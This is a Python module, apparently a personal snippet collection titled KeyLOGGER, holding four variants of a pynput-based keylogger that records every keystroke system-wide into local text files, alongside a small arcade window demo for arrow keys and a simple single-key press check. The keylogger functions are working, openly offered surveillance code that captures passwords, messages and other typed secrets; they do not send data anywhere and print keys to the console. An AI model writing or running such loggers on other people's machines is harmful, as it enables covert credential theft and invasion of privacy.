# import KeyLOGGER as keylogger
# keylogger.keypressesDetectShow() # KEYPRESSESdetect
# keylogger.keyLoggerStart()
# keylogger.keyLogger2Start()
# keylogger.isPressedKEY("w")





# v1
# import KeyLOGGER as keyLogger
# keyLogger.keyLoggerStart()
#
# Required
# pip install pynput
#
# It Keeps a Log Text File - specify the log file name

def keyLoggerStart():
    from pynput.keyboard import Listener, Key

    filename = "key_log.txt"  # The file to write characters to

    def on_press(key):
        f = open(filename, 'a')  # Open the file

        if hasattr(key, 'char'):  # Write the character pressed if available
            f.write(key.char)
            print(key.char)
        elif key == Key.space:  # If space was pressed, write a space
            f.write(' ')
            print(" ")
        elif key == Key.enter:  # If enter was pressed, write a new line
            f.write('\n')
            print("\n")
        elif key == Key.tab:  # If tab was pressed, write a tab
            f.write('\t')
            print("\t")
        else:  # If anything else was pressed, write [<key_name>]
            f.write('[' + key.name + ']')
            print('[' + key.name + ']')

        f.close()  # Close the file

    with Listener(on_press=on_press) as listener:  # Setup the listener
        listener.join()  # Join the thread to the main thread






# v1

# import KeyLOGGER as keylogger
# keylogger.keypressesDetectShow()

def keypressesDetectShow():
    # Importing arcade module
    import arcade  # pip install arcade

    # Creating MainGame class
    class MainGame(arcade.Window):
        def __init__(self):
            super().__init__(300, 300, title="Keyboard Inputs")

        # Creating on_draw() function to draw on the screen
        def on_draw(self):
            arcade.start_render()

        # Creating function to check button is pressed
        # or not
        def on_key_press(self, symbol, modifier):

            # Checking the button pressed
            # is up arrow key or not
            if symbol == arcade.key.UP:
                print("Upper arrow key is pressed")
            if symbol == arcade.key.RIGHT:
                print("Right arrow key is pressed")
            if symbol == arcade.key.DOWN:
                print("Lower arrow key is pressed")
            if symbol == arcade.key.LEFT:
                print("Left arrow key is pressed")

        # Creating function to check button is released
        # or not
        def on_key_release(self, symbol, modifier):

            # Checking the button pressed
            # is up arrow key or not
            if symbol == arcade.key.UP:
                print("Upper arrow key is released")
            if symbol == arcade.key.RIGHT:
                print("Right arrow key is released")
            if symbol == arcade.key.DOWN:
                print("Lower arrow key is released")
            if symbol == arcade.key.LEFT:
                print("Left arrow key is released")

    # Calling MainGame class
    MainGame()
    arcade.run()










# import KeyLOGGER as keyLogger
# keyLogger.keyLogger4Start()
#
"""
from pynput import keyboard
def on_press(key):
    with open('keylogs.txt', 'a') as logs:
            logs.write(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()
"""
def keyLogger4Start():
    from pynput import keyboard

    class KeyLogger():
        def __init__(self, filename: str = "keylogs.txt") -> None:
            self.filename = filename

        @staticmethod
        def get_char(key):
            try:
                return key.char
            except AttributeError:
                return str(key)

        def on_press(self, key):
            print(key)
            with open(self.filename, 'a') as logs:
                logs.write(self.get_char(key))

        def main(self):
            listener = keyboard.Listener(
                on_press=self.on_press,
            )
            listener.start()

    #if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()






# import KeyLOGGER as keyLogger
# keyLogger.keyLogger3Start()
#

def keyLogger3Start():
    from pynput.keyboard import Key, Listener
    import logging

    log_dir = ""

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        print(str(key))
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()



# import KeyLOGGER as keyLogger
# keyLogger.keyLogger2Start()
#

def keyLogger2Start():
    from pynput.keyboard import Key, Listener

    keys = []

    def on_each_key_press(key):
        keys.append(key)
        write_keys_to_file(keys)
        print(key)

    def write_keys_to_file(keys):
        with open('log.txt', 'w') as logfile:
            for key in keys:
                key = str(key).replace("'", "")
                logfile.write(key)

    def on_each_key_release(key):
        if key == Key.esc:
            return False

    with Listener(
            on_press=on_each_key_press,
            on_release=on_each_key_release
    ) as listener:
        listener.join()





# v1

# import KeyLOGGER as keypress
# keypress.isPressedKEY("w")

# is a key pressed? simple

#Required:
# pip install keyboard

# KeyLOGGERkeypress
def isPressedKEY(key_p='q'):
    import keyboard  # using module keyboard
    while True:  # making a loop
        try:  # used try so that if user pressed other than the given key error will not be shown
            if keyboard.is_pressed(key_p):  # if key 'q' is pressed
                print(f'You Pressed {key_p} Key!')
                break  # finishing the loop
            if keyboard.is_pressed('right'):  # if key 'q' is pressed
                print('You Pressed right Key!')
                break  # finishing the loop
        except:
            break  # if user pressed a key other than the given key the loop will break




